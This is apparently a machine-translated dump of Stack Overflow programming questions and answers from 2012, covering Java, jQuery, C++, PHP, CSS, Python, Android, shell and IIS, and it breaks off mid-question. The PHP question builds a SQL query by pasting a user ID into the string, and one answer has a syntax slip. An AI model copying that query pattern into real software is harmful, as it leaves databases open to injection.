我想修改以下方法，使其参数可以是实现`Comparable`接口的任何类型。方法的返回类型应该与其参数变量的类型相同。

```
public static int max(int a, int b) {   
    if (a >b) 
        return a;  
    else 
        return b;
} 
```

所以在修改它时，我可以只使用`<T extends Comparable<T>>`，但是我将如何使返回类型相同呢？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-29T00:38:35.303

你基本上想要这样的东西：

```
public static <T extends Comparable<T>> T max(T a, T b) {
    int n = a.compareTo(b);
    if (n > 0)
        return a;
    if (n < 0)
        return b;
    return a;
} 
```

您当然可以将其简化为以下内容（感谢@pickypg 的通知）：

```
public static <T extends Comparable<T>> T max(T a, T b) {
    return a.compareTo(b) < 1 ? b : a;
} 
```

# jquery - jQuery：捕获anchor href onclick并异步提交

> ID：12648916
> 
> 赞同：30
> 
> 时间：2012-09-29T00:33:59.237
> 
> 标签：jquery, ajax, hyperlink, anchor

我几乎从来没有玩过客户端的东西，而且这个可能很简单的任务正在踢我的屁股:)

我有一些链接。OnClick 我想阻止默认操作，捕获其 href url，向该 url 提交一个 ajax GET，并简单地`alert()`使用结果......但我什至无法越过起跑线 :)

播放时间的示例锚点：

```
<a class="asynch_link" href="good/1.html">Click Here</a>
<a class="asynch_link" href="good/2.html">Click Here</a> 
```

现在，我已经针对 SO 上的*类似*请求提出了一些建议，但这些链接仍然会导致浏览器导航到 href url。

即使只有

```
<script type="text/javascript">
    $('a').click(function (event) 
    { 
         event.preventDefault(); 
         //here you can also do all sort of things 
    });
</script> 
```

...链接仍然导航到其他页面。

我有点像这里的婴儿:)

任何和所有的帮助将不胜感激。

而且，是的，我包括***jQuery*** :)
`<script src="//67.20.99.206/javascripts/jqueryCountdown/1-5-11/jquery.countdown.js" type="text/javascript" charset="utf-8"></script>`

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-09-29T19:18:19.533

```
$('a').click(function(event) { 
    event.preventDefault(); 
    $.ajax({
        url: $(this).attr('href'),
        success: function(response) {
            alert(response);
        }
    });
    return false; // for good measure
}); 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2012-09-29T00:40:28.810

试试这个

```
$('a').click(function (event) 
{ 
   event.preventDefault(); 

   var url = $(this).attr('href');
   $.get(url, function(data) {
     alert(data);
    });

 }); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-29T00:39:35.640

这里的问题是事件**没有被附加**到您的元素，因为它们没有被绑定在 DOM 就绪事件中。尝试将您的事件包含在 DOM 就绪事件中，如果有效，您将看到警报

```
<script> 
    $(function() {
         $('a').click(function(event) {
            event.preventDefault();
            alert('fff')
        //here you can also do all sort of things 
        });
    }); 
</script> 
```

在此之后发送 Ajax 请求并在 Success 回调函数中提交表单..

```
<script> 
    $(function() {
         $('a').click(function(event) {
             event.preventDefault();
             $.ajax({
                 url: 'url',
                 dataType :'json',
                 data : '{}',
                 success :  function(data){
                     // Your Code here

                     $('#form').submit();
                 }
             })
        });
    }); 
</script> 
```

# android - 如何在 javadoc 生成的 html 中正确地为 android 类添加前缀？

> ID：12648922
> 
> 赞同：1
> 
> 时间：2012-09-29T00:35:09.627
> 
> 标签：android, ant, javadoc

我正在使用 Ant JavaDoc 为我的 Android 应用程序库生成 HTML 文档。我遇到了一个问题，它为来自 Google Android SDK 的 Intent 和 Context 等内容抛出错误“找不到符号”。我不想在我生成的文档中从外部链接到这些 API，但我确实希望它们在文档中完全合格。我的意思是参数只是像上下文一样被指定，但我希望它被生成为android.content.Context。有没有办法通过 Ant JavaDoc 的选项来实现这一点？如果没有外部链接，我似乎无法找到如何做到这一点。

谢谢，德里克

# c++ - 如何删除多个指向同一地址的指针

> ID：12648923
> 
> 赞同：0
> 
> 时间：2012-09-29T00:35:14.963
> 
> 标签：c++, pointers, delete-operator

> **可能重复：**
> [如何安全地删除多个指针](https://stackoverflow.com/questions/3932367/how-to-safely-delete-multiple-pointers)

如下代码：

```
#include <iostream>
using namespace std;

int main(int argc, _TCHAR* argv[])
{
    int *p, *q;
    q = new int;
    p = q;
    delete q;
    q = NULL;
    cout << p << "  " <<q << endl;
    return 0;
} 
```

`p`指向`q`. 当我删除`q`和`q`=`NULL`时，`p`仍然指向旧地址。有没有人有任何方法可以自动`p`指出`q` `NULL`？因为如果在一个程序中有很多指针指向同一个地址，我们不能让它们指向`NULL`它会带来问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T00:56:53.157

有一种智能指针可以完成这项工作。这段代码可能存在线程安全问题，（事实上我保证会有）。

```
template <class T>
class DoublyLinkedSmartPointer
{
   public:
      DoublyLinkedSmartPointer(const DoublyLinkedSmartPointer &other);
      DoublyLinkedSmartPointer& operator=(const DoublyLinkedSmartPointer& other);
      virtual ~DoubleLinkedSmartPointer();
      T * operator*();
      const T* operator*() const;

      void freeAll();
   private:

      DoublyLinkedSmartPointer *next, *previous;
      T * data;
} 
```

基本思想是，每当复制智能指针时，使用用于初始化它的智能指针将副本添加到列表中。当您删除指针时，您将其从列表中释放。

现在，棘手的一点是，由于每个指针都知道其他指针，因此您可以从任意点逐步遍历列表，并将每个节点中的数据设置为 NULL。

好的，这就是你可以做到的。但更重要的是，不要这样做。您几乎肯定会创建难以维护且几乎无法调试的代码。最好的内存管理策略是最简单的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T09:59:31.730

The general advise for C++ programs is to avoid elementary pointers, precisely to avoid the issues you're having. Instead, use the language's (or more precisely its standard library's) methods to deal with pointers:

1 use containers, such as `std::vector`, instead of pointers to (chunks of) memory allocated on the heap

2 use `std::unique_ptr` and `std::shared_ptr` (and `std::weak_ptr`) to manage objects allocated on the heap. This only works properly in C++11 with its move semantics, see the standard header .

advantages: automatic de-allocation without leaving dangling pointers; exception safety (throwing an exception and stack-rewinding does not leak memory).

# php - PHP - 在循环中返回一次收集的值

> ID：12648925
> 
> 赞同：0
> 
> 时间：2012-09-29T00:35:41.157
> 
> 标签：php, loops, return

你能帮我解决这个问题吗？我想一次返回所有收集的电子邮件地址。这是代码。添加评论。

```
function send_notification($ML_today) {

    // Getting expired contents from the database through a function
    $ML_send_to = check_expired($ML_today);

    if(count($ML_send_to) != 0){
        foreach ($ML_send_to as $ML_user_id) {
            $ML_query_email = mysql_query("SELECT `email` FROM `users` WHERE `userID` = '$ML_user_id'");
            $ML_row_3 = mysql_fetch_array($ML_query_email);
            $ML_email = $ML_row_3[0];

            $ML_to      = $ML_email;
            $ML_subject = 'Library notification';
            $ML_message = 'You have an expired library book to be returned. Please check your reservations.';
            $ML_headers = 'From: libray@example.com' . "\r\n" .
            'Reply-To: libraryr@example.com' . "\r\n" .
            'X-Mailer: PHP/' . phpversion();

            mail($ML_to, $ML_subject, $ML_message, $ML_headers);

            // Here I want to collect all the email addresss I sent emails and return once

            $ML_sent_all = // Stucked here

        }
        // Rerturning Emails
        return 'Message sent to: ' . $ML_sent_all;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T00:52:48.407

首先，您应该使用`IN`以获得更好的性能，例如：

```
SELECT * FROM table WHERE id IN(2,3,5,7,11) 
```

如何在不掉进熔岩坑的情况下创造这个`mysql_*`？[正如这个答案所报告的](https://stackoverflow.com/questions/920353/php-pdo-can-i-bind-an-array-to-an-in-condition)：

```
$ids     = $ML_send_to;
$inQuery = implode(',', array_fill(0, count($ids), '?'));

// you'll need to put your connection credentials here, see PDO docs
$db = new PDO(...);
$stmt = $db->prepare(
    'SELECT email
     FROM users
     WHERE userID IN(' . $inQuery . ')'
);

$stmt->execute($ids); 
```

循环结果，并构建全部发送的字符串：

```
$ML_sent_all = "";

foreach($stmt -> fetchAll() as $row){

    $singleEmail = $row['email'];

    // do your stuff as before

    $ML_sent_all .= $singleEmail . ", ";

} 
```

修剪最新的逗号和空格；

```
$ML_sent_all = substr($ML_sent_all, 0 strlen($ML_sent_all) - 2); 
```

* * *

[**PDO 构造参考**](http://php.net/manual/en/pdo.construct.php)

# javascript - 如何禁用javascript中的按钮？

> ID：12648926
> 
> 赞同：0
> 
> 时间：2012-09-29T00:35:51.640
> 
> 标签：javascript

我有一个在开始时启用的按钮，但我想禁用它。我需要它来玩游戏。如果玩家选择玩更多，游戏会重新开始，如果没有，“点击我”按钮应该被禁用。先感谢您！

这是我的代码：

```
 var y;
    function playAgain()
    {
        y=confirm("PLAY AGAIN?");

        if(y==true)
        {
            alert("Let's play it again!");
            location.reload(true);
        }
        else if(y==false)
        {
            alert("Thank you!\nSee you soon!");
            document.getElementById("button").disabled="disabled";
            //document.getElementById("button").disabled="true";
        }
    } 
```

HTML 代码：

```
<body>
    <input type="button" value="Click on me" onClick="playAgain()"  />
</body> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T00:39:57.540

这将起作用：

```
document.getElementById("button").disabled = true; 
```

如果您的按钮实际上有`id="button"`：

```
<input id="button" type="button" value="Click on me" onClick="playAgain()"  /> 
```

重新启用按钮集`.disabled = false;`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-29T00:40:04.857

您正在使用`document.getElementById("button")`，但 HTML 中没有命名元素`button`。

```
<input type="button" id="button" value="Click on me" onClick="playAgain()"  /> 
```

此外，要禁用按钮，请将其`disabled`属性设置为 true（否则为 false）。

```
document.getElementById('button').disabled = true; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T00:40:13.250

用 jquery 你可以说

```
$("[type=button]").click(function(){
    $(this).attr("disabled","disabled");
    ... your other code ...
}); 
```

# mysql - 如何在 MySQL 中设计类别和子类别？

> ID：12648929
> 
> 赞同：5
> 
> 时间：2012-09-29T00:36:12.527
> 
> 标签：mysql, sql, database, sqlite

我有一个类别列表和与每个类别相关的子类别数量。假设类别表称为 Cat 然后我在其中有冷热类别我有另一个名为 subcats 的表然后我有以下内容：

*猫*：

```
 ID Name
 1 Hot
 2 Cold 
```

*子猫*：

```
SubCatID   CATID   Name
  1       1        soup 
  2       1       rice 
  3       1       pizza 
  4       2       salad 
  5       2       fruit 
```

我应该在我的设计中考虑性能，你如何评价我的设计？有没有更好的解决方案？

（类别只是示例 - 我有很多类别和子类别。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T00:52:32.733

如果您使用 mysql 和/或 sqlite（您的标签中都有），不提供任何用于递归查询的构造，那么您可能会更好地使用嵌套集模型而不是父/子关系。

它可能非常过分，或者它可能不适合目的（如果它的插入比读取更重），但尽管如此，学习它很有趣，所以请阅读这些

[http://mikehillyer.com/articles/managing-hierarchical-data-in-mysql/](http://mikehillyer.com/articles/managing-hierarchical-data-in-mysql/)

[http://en.wikipedia.org/wiki/Nested_set_model](http://en.wikipedia.org/wiki/Nested_set_model)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-29T00:45:26.010

您可以将所有内容放在一个表中，类别。然后有一个 parentID 列。如果parentID = 0，它是一个主类别，如果它是另一个ID，那么它是一个子类别？这种结构将支持子子类别......不确定这是否对您有帮助。

示例字段：

```
Table: category
categoryID
parentID
name 
```

示例数据：

```
categoryID : 1
parentID : 0
name : hot

categoryID : 2
parentID : 0
name: cold

categoryID : 3
parentID : 2
name : a soup that's cold

categoryID : 4
parentID: 1
name: a soup that's hot 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-29T00:50:15.323

您的表结构确实没有问题。它已经很好地标准化，并且您已经以标准方式实现了它。跨表使用外键约束可能是个好主意（如果您还没有）。

然而，正如 Zeke 所说，您的设计不会支持多个级别的子类别，但只要您知道只有类别和子类别，就可以了。

如果您确实想要“子子类别”（无限程度），您可能只想要一个像这样的表：

猫：

```
CatID ParentCatID Name
1     null        Hot
2     1           Soup
3     1           Coffee
4     3           Decaf Coffee
5     null        Cold
6     5           Iced Tea 
```

请注意，Coffee 的父 ID 是“Hot”，而 Decaf Coffee 的 ParentID 是“Coffee”。太热了>咖啡>无咖啡因咖啡。ParentCatID 为 null 的任何内容都将是顶级类别。

您可以拥有一个引用它自己的表的外键。因此，您可以在 ParentCatID 和 CatID 之间创建一个外键。

# php - 在 php 邮件中包含整个页面

> ID：12648930
> 
> 赞同：0
> 
> 时间：2012-09-29T00:36:25.633
> 
> 标签：php

是否可以在 php 电子邮件中包含单独的 html 页面？

例如，创建一个单独的页面，其中包含我想通过电子邮件发送的所有内容，然后将其作为消息包含在另一个页面上的 php mail() 中？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:40:15.440

如果您的意思是发送 HTML 电子邮件，是的。你可以这样做。您只需要在[mail()的第四个参数中添加额外的标头，并使用](http://www.php.net/mail)[file_get_contents()](http://www.php.net/file_get_contents)从您拥有的 HTML 文件中提取信息。请检查：

[http://css-tricks.com/sending-nice-html-email-with-php/](http://css-tricks.com/sending-nice-html-email-with-php/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T00:57:03.430

是的，可能正是rationalboss 的解释。我个人将[PEAR](http://pear.php.net/package/Mail/)用于 html 电子邮件。如果您对 PEAR 不熟悉，开始使用会很痛苦，但是一旦我开始使用它，生活就会有所改善。

不过要小心，html/css 在电子邮件客户端中的支持与在浏览器中的支持不同。您可以创建一个漂亮的页面，并发现由于某些 CSS 规则被忽略，大多数人收到它时都会出现巨大的故障。

我最后听到的最佳实践是保持简单并为所有内容使用内联样式。避免浮动和定位。事实上，如果您需要将东西放在一起，我相信在处理电子邮件布局时使用表格实际上更安全。

然后在尽可能多的电子邮件客户端中进行测试。然后哭泣并尝试解决问题。

我听说过有关[在 Acid 上使用电子邮件](http://www.emailonacid.com/)进行测试的好消息。这是一项付费服务​​，但他们也为 3 个客户提供有限的测试。

如果您只是在做一个相对简单的电子邮件，那么它应该不会太糟糕。但是，如果您正在尝试制作看起来很棒的东西，我建议您在谷歌上搜索专门用于电子邮件的 html 样式。

# html - 位置：绝对和溢出：隐藏？

> ID：12648936
> 
> 赞同：0
> 
> 时间：2012-09-29T00:38:06.790
> 
> 标签：html, position, overflow, css-position, hidden

我正在尝试在 div 中放置一些图像。只应显示一张图像。我用：

```
<div id="slideshow" style="width:600px;height:400px;position:absolute;overflow:hidden;"></div>
<img src="img3.png" width="600px" height="400px" id="img3" style="position:absolute;left:0px;">
<img src="img2.png" width="600px" height="400px" id="img2" style="position:absolute;left:600px;">
<img src="img1.png" width="600px" height="400px" id="img1"     style="position:absolute;left:1200px;">
</div> 
```

但是图像从 div 溢出并且是可见的。我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T01:02:25.197

让我们从修复您的标记开始...

```
<style>
#slideshow{
    width:600px;
    height:400px;
    position:absolute;
    overflow:hidden;
}

#slideshow img{
    width:600px;
    height:400px;
    float:left;
}
</style>

<div id="slideshow">
    <img src="img3.png" id="img3">
    <img src="img2.png" id="img2">
    <img src="img1.png" id="img1">
</div> 
```

所以原因是因为你在父母和孩子中都定义了 position:absolute 。您可以将图像标签包装在相对定位的 div 中。这会将绝对位置重置为相对定位的父级的左上角。

但是，在这种情况下，您需要做的就是向左浮动。没有理由在幻灯片元素中使用绝对定位的子元素。

# asp.net-mvc-3 - mvc 3 返回与其他对象的视图

> ID：12648941
> 
> 赞同：0
> 
> 时间：2012-09-29T00:38:48.967
> 
> 标签：asp.net-mvc-3, object

我有一个详细信息页面，它返回一个基本用于从数据库中查找页码的**配置文件视图。**我还有一个单独的查询，我想在**返回视图**中返回，但不知道怎么做。我的代码是

```
public ActionResult detail(int id)
    {
        profile profile = db.profiles.Find(id);
        var currentpage = (from s in db.profiles where id == s.profileID select s.registrationID).FirstOrDefault();
        var articles = (from s in db.Articles where currentpage == s.RegistrationID select s.title).FirstOrDefault();
        ViewBag.articles = articles;

        ViewBag.noprofiler = " This profile currently doesn't have the email profiler selected";

        return View(profile);
    } 
```

我也想退回**文章**，我把它放进了一个**viewbag**但这没有任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:59:56.630

如果文章已填充，那么您应该能够通过 ViewBag.articles 在视图中访问它

也许您应该检查控制器函数中的文章变量中的内容。

变量名文章也建议您正在寻找一个列表，但您正在使用 FirstOrDefault() 它将返回单个对象（或 null）。

# web-frameworks - 挂毯入门

> ID：12648943
> 
> 赞同：0
> 
> 时间：2012-09-29T00:39:25.093
> 
> 标签：web-frameworks, tapestry

一切正常，直到 mvn jetty:run 以 [ERROR] 结尾 无法在项目 newapp 上执行目标 org.mortbay.jetty:maven-jetty-plugin:6.1.16:run (default-cli)：失败：地址已在使用中: 绑定

这并不奇怪，因为我在 8080 上使用自己的站点（无法更改）运行 Tomcat。mvn 确实安装了码头并尝试运行它吗？我可以将 Jetty 配置到不同的端口，或者改用 Tomcat 吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T00:06:28.617

您可以通过设置系统属性**jetty.port**来配置 Jetty 以使用另一个端口。

jetty.port属性可以在运行 Maven 时在命令行中设置**：**

```
mvn -Djetty.port=9090 jetty:run 
```

或者可以在项目的 pom.xml 中设置，作为**maven-jetty-plugin**配置的一部分：

```
<plugin>
    <groupId>org.mortbay.jetty</groupId>
    <artifactId>maven-jetty-plugin</artifactId>
    <version>6.1.16</version>
    <configuration>
        <systemProperties>
            <systemProperty>
                <name>tapestry.execution-mode</name>
                <value>development</value>
            </systemProperty>
            <systemProperty>
                <name>jetty.port</name>
                <value>9090</value>
            </systemProperty>
        </systemProperties>
    </configuration>
</plugin> 
```

在这两个示例中，Jetty 都配置为侦听端口 9090。

# objective-c - 在 UITextField 中禁用“定义”

> ID：12648956
> 
> 赞同：10
> 
> 时间：2012-09-29T00:41:05.893
> 
> 标签：objective-c, ios

我有一个`UITextField`只显示数值（0-9，.，-）。当用户选择文本字段的内容时，会出现一个带有“复制”、“粘贴”和“定义”的菜单。由于文本字段仅显示数值，我不希望出现“定义”选项。如何禁用字典中的“定义”选项`UITextField`？

编辑：我已经解决了这个问题并在下面发布了解决方案

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-07-29T13:43:40.970

**斯威夫特 - iOS 8**

您可以通过继承 UITextField 和覆盖`canPerformAction:WithSender`方法来做到这一点。

```
class MyTextFieldWithoutDefine: UITextField {
    override func canPerformAction(action: Selector, withSender sender: AnyObject?) -> Bool {
        if action == "_define:" {
            return false
        }

        return super.canPerformAction(action, withSender: sender)
    }
} 
```

所有动作列表：

```
cut:
copy:
select:
selectAll:
paste:
delete:
_promptForReplace:
_transliterateChinese:
_showTextStyleOptions:
_define:
_addShortcut:
_accessibilitySpeak:
_accessibilitySpeakLanguageSelection:
_accessibilityPauseSpeaking:
makeTextWritingDirectionRightToLeft:
makeTextWritingDirectionLeftToRight: 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-12-04T09:22:01.067

问题评论区的解决方案对我不起作用（ios8），我收到错误：

`action == @selector(defineSelection:)`

通过指定我想包含在菜单中的选项，我能够从编辑菜单中删除“定义”：

```
- (BOOL)canPerformAction:(SEL)action withSender:(id)sender {
    if (action == @selector(copy:) ||
        action == @selector(selectAll:)) {
        return true;
    }

    return false;
} 
```

更完整的答案：[如何以编程方式禁用 UITextField 中的复制粘贴选项](https://stackoverflow.com/questions/6701019/how-to-disable-copy-paste-option-from-uitextfield-programmatically) （谢谢 serge-k）

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-29T02:13:50.307

如果使用 NIB，请将 UITextField 的“Correction”属性设置为“NO”（默认值为 YES）。

如果使用代码，请将“autocorrectionType”设置为“UITextAutocorrectionTypeNO”。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-09-29T01:07:00.793

尝试这个：

```
UITextField* textField = //...;
textField.autocorrectionType = UITextAutocorrectionTypeNo; 
```

# jquery - 使用 nav 将简单的 jquery sideshow 居中时出现问题

> ID：12648958
> 
> 赞同：0
> 
> 时间：2012-09-29T00:41:24.777
> 
> 标签：jquery

我目前正在重新编码我的网站。保持最小化。但我无法让链接导航正常运行。我希望他们坐在大约 50 像素的图像下方。目前在导航 div 上，我的边距顶部值约为 550 像素。但是，一旦您将它放在不同尺寸的屏幕上，它显然会根据屏幕尺寸而更高或更低。我显然很新，非常感谢您的帮助！

你可以在这里查看我的网站： [www.twentyfivethree.com](http://www.twentyfivethree.com)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T01:07:55.260

无论屏幕大小如何，要实现垂直和水平一致的定位，您可以做的就是重复图像的相同 css。像这样的东西：

```
.nav {
  position:absolute;
  top:50%;
  left:50%;
  width:380px;
  height:20px;
  margin-left:-190px;
  margin-top:180px;
} 
```

这与应用于导航的过程几乎相同。您将需要调整像素尺寸以适合您的布局和设计。

# html - 将 div 相对水平对齐和绝对垂直对齐

> ID：12648961
> 
> 赞同：1
> 
> 时间：2012-09-29T00:44:15.627
> 
> 标签：html, css

我正在尝试做的是将 div 块相对于左侧的内容对齐（比如可能存在图像），但始终位于 div 的底部。我只想用 CSS 来做，但如果那不可能，那么无论如何都可以。

**编辑**

如果没有那么多文字，这就是它应该看起来的样子

```
+---------------------+
|+---+Hello world!    |
||img|                |
|+---+[button]        |
+---------------------+ 
```

如果有很多文字

```
+---------------------+
|+---+Hello world!    |
||img|Hello world!    |
|+---+Hello world!    |
|Hello world!         |
|[button]             |
+---------------------+ 
```

我希望这能清除我正在寻找的东西。无论文本是否触及该按钮，该按钮都应始终位于页面底部。按钮也应该尽可能地向左而不重叠任何东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T09:32:29.830

您不能为一个元素指定两个不同的位置。相反，您可以通过使用包装器元素包装您的元素来解决此问题。给包装器位置：相对。给你要垂直定位的元素 position:absolute;

[http://jsfiddle.net/3hBds/](http://jsfiddle.net/3hBds/)

在下面的示例中，我将“相对水平”解释为水平堆叠元素，这是我通过浮动完成的。

**编辑：** 要让您的文本包裹图像，请浮动图像。显示了两个示例。最后一个例子是如果你不清除浮动图像会发生什么。用 div 包裹您的文本和图像，以便始终按下按钮。

[http://jsfiddle.net/apjX7/1/](http://jsfiddle.net/apjX7/1/)

# python - 基于标志终止python线程

> ID：12648962
> 
> 赞同：2
> 
> 时间：2012-09-29T00:44:32.550
> 
> 标签：python, multithreading

我创建了一个 python 线程。通过调用它的 start() 方法来运行它很有趣，我监视线程内部的一个 falg，如果该标志 == True，我知道用户不再希望线程继续运行，所以我想做一些房屋清洁并终止线程。

但是我无法终止线程。我试过 thread.join() ， thread.exit() ，thread.quit() ，都抛出异常。

这是我的线程的样子。

编辑 1：请注意 core() 函数是在标准 run() 函数中调用的，我没有在这里展示。

**编辑 2：当 StopFlag 为 true 时，我刚刚尝试了 sys.exit() ，它看起来线程终止了！随身携带安全吗？**

```
class  workingThread(Thread):

    def __init__(self, gui, testCase):
        Thread.__init__(self)
        self.myName = Thread.getName(self)
        self.start()    # start the thread

    def core(self,arg,f) : # Where I check the flag and run the actual code

        # STOP
        if (self.StopFlag == True):
            if self.isAlive():

                self.doHouseCleaning()
                # none of following works all throw exceptions    
                self.exit()
                self.join()
                self._Thread__stop()
                self._Thread_delete()
                self.quit()

            # Check if it's terminated or not
            if not(self.isAlive()):
               print self.myName + " terminated " 

        # PAUSE                                                        
        elif (self.StopFlag == False) and not(self.isSet()):

            print self.myName + " paused"

            while not(self.isSet()):
                pass

        # RUN
        elif (self.StopFlag == False) and self.isSet():
            r = f(arg) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T01:12:02.240

这里有几个问题，也可能是其他问题，但是如果您没有显示整个程序或特定异常，这是我能做的最好的：

1.  线程应该执行的任务应该被称为“运行”或传递给线程构造函数。
2.  线程本身不会调用join()，启动线程的父进程调用join()，这使得父进程阻塞，直到线程返回。
3.  通常父进程应该调用run()。
4.  一旦完成（从）run() 函数返回，线程就完成了。

简单的例子：

```
import threading
import time

class MyThread(threading.Thread):

    def __init__(self):
        super(MyThread,self).__init__()
        self.count = 5

    def run(self):
        while self.count:
            print("I'm running for %i more seconds" % self.count)
            time.sleep(1)
            self.count -= 1

t = MyThread()
print("Starting %s" % t)
t.start()
# do whatever you need to do while the other thread is running
t.join()
print("%s finished" % t) 
```

输出：

```
Starting <MyThread(Thread-1, initial)>
I'm running for 5 more seconds
I'm running for 4 more seconds
I'm running for 3 more seconds
I'm running for 2 more seconds
I'm running for 1 more seconds
<MyThread(Thread-1, stopped 6712)> finished 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T07:42:05.057

没有明确的方法可以从对线程实例的引用或从线程模块中杀死线程。

话虽如此，运行多个线程的常见用例确实提供了防止它们无限期运行的机会。[例如，如果您正在通过urllib2](http://docs.python.org/library/urllib2.html#urllib2.urlopen)连接到外部资源，则始终可以指定超时：

```
import urllib2
urllib2.urlopen(url[, data][, timeout]) 
```

套接字也是如此：

```
import socket
socket.setdefaulttimeout(timeout) 
```

请注意，调用指定超时的线程的 join([timeout]) 方法只会阻塞 hte 超时（或直到线程终止。它不会杀死线程。

如果您想确保线程在程序完成时终止，只需确保在调用它的 start() 方法之前将线程对象的 daemon 属性设置为 True。

# java - 从另一个类访问时，Getter 函数不返回值

> ID：12648963
> 
> 赞同：0
> 
> 时间：2012-09-29T00:44:49.153
> 
> 标签：java, android

我有一堂课如下：

```
public class Element extends Activity
{
public float mX;
    public float mY;
 public void animate(long elapsedTime) 
    {
        mX += mSpeedX * (elapsedTime / 20f);
        mY += mSpeedY * (elapsedTime / 20f);
        setmX(mX);
        setmY(mY);
        checkBorders();
    }
public void setmX(float mX) 
{
Log.i("this.mX","mY at setmX read is :"+this.mX );      **//Line 1**
        this.mX = mX;
    }
public float getmX() {
        Log.i("mX","mX in getmX read is :"+mX );    **//Line 2**
        return mX;
    }

    public void setmY(float mY) {

        this.mY = mY;
        Log.i("this.mY","mY at setmY read is :"+this.mY );  **//Line 3**
    }

    public float getmY() {
        Log.i("mY","mY in getY read is :"+mY );    **//Line 4**

        return mY;
    }
} 
```

我还有一堂课

```
public class Panel extends SurfaceView implements SurfaceHolder.Callback
{
int x = 100;
    int y = 0;
public float xval;
    public float yval; 
@Override
    public boolean onTouchEvent(MotionEvent event) 
    {
        Element element = new Element();
        float x = event.getX();
        float y = event.getY();
        Log.i("x","x in panel is :"+x);
        //toast tos = new toast();

        xval = element.getmX();
        Log.i("xval","xval in playactivity obtained is :"+xval );   **//Line 5**
        yval = element.getmY();
        Log.i("yval","yval in playactivity obtained is :"+xval );    **//Line 6**
return super.onTouchEvent(event);
} 
```

第 2、4、5 和 6 行将值显示为零。我不想这样做。下面是 logcat 图像。 ![在此处输入图像描述](../Images/f2f73142ff62634d9ba674af1b64c210.png)

**我在访问说明符中犯了错误吗？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:54:57.377

我们很难在不知道`mSpeedX`和的情况下判断发生了什么`mSpeedY`。在进行数学运算之前，尝试将两者`elapsedTime`和变量都转换为浮点数。`mSpeedX/Y`浮点数学在 Java 中非常挑剔。还要确保该`animate`方法实际上正在被调用。

最后一点，我可能不应该提出这个问题，但这让我很生气。你应该**真的，真的**致力于你的代码一致性和风格。您的命名约定、换行符/同一行大括号约定和缩进习惯无处不在。如果您的编程风格**不一致**，代码的可读性和可维护性就会显着下降。

还有一件事：在将值分配给变量后，您不需要调用 setter 方法。您已经设置了 set/get 方法正在访问的同一个变量的值。祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:55:02.950

*   您不应该在另一个类中创建 Activity 类的对象（在您的 Element 类中）。请仔细阅读[应用程序基础知识](http://developer.android.com/guide/components/fundamentals.html)
*   尽管您在`Element`类中创建类的对象`Panel`，但您从未调用 setter 方法 setmX() 和 setmY() 来设置值。您直接调用返回默认值的 getter 方法。

# linux - 脚本完成百分比：用百分比命名文件

> ID：12648965
> 
> 赞同：1
> 
> 时间：2012-09-29T00:45:23.187
> 
> 标签：linux, unix, ksh, percentage

我有一个同时在 2k 服务器上运行的脚本，它在 NAS 上创建一个临时工作目录。

该脚本构建文件列表...该列表可以是 1k 文件或 1m 文件。我在列表上运行一个 for 循环以在每个文件上运行一些 grep 命令

```
counter=0
num_files=`wc -l $filelist`
cat $filelist| while read line; do
do_stuff_here
counter=`expr $counter+ 1`
((percent=$counter/$num_files))
##CREATE a file named "$percent".percent
done 
```

我在想的是我可以从列表中获取文件总数（ wc -l $filelist ）并添加一个我在循环中增加 1 的计数器。然后我可以划分 $counter/$num_files。

这似乎可行，但我遇到的问题是我想重命名同一个文件，而不是每次都创建一个新文件。我可以在这里做什么？

我不希望它输出到标准输出/标准错误……我已经有足够的东西去这些地方了。我希望能够浏览到 WinSCP 中的子目录并快速查看每个子目录的位置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T01:10:16.507

试试这个

```
touch 0.percent 
counter=0 
num_files=$(wc -l $filelist)
num_files=${num_files/ */}
cat $filelist| while read line; do 
do_stuff_here 
mv -f {$((counter*100/num_files)),$((++counter*100/num_files))}.percent 
done 
rm -f *.percent 
```

# asp.net-mvc - IIS7 cacheControlMaxAge 属性不起作用

> ID：12648967
> 
> 赞同：7
> 
> 时间：2012-09-29T00:45:26.950
> 
> 标签：asp.net-mvc, caching, https, iis-7.5, browser-cache

在 IIS 7.5 中，我将 cacheControlMaxAge 设置为一年，就像这样

```
<location path="Content/Images">
    <system.webServer>
      <staticContent>
        <clientCache cacheControlCustom="public" cacheControlMode="UseMaxAge" cacheControlMaxAge="365.00:00:00" />
      </staticContent>
    </system.webServer>
  </location> 
```

根据本指南：[设置过期和缓存控制：ASP.NET 中静态资源的最大年龄标头](http://www.stardeveloper.com/articles/expires-and-max-age-headers-in-aspnet/)

但是，Google PageSpeed 工具仍然说文件没有被缓存：

```
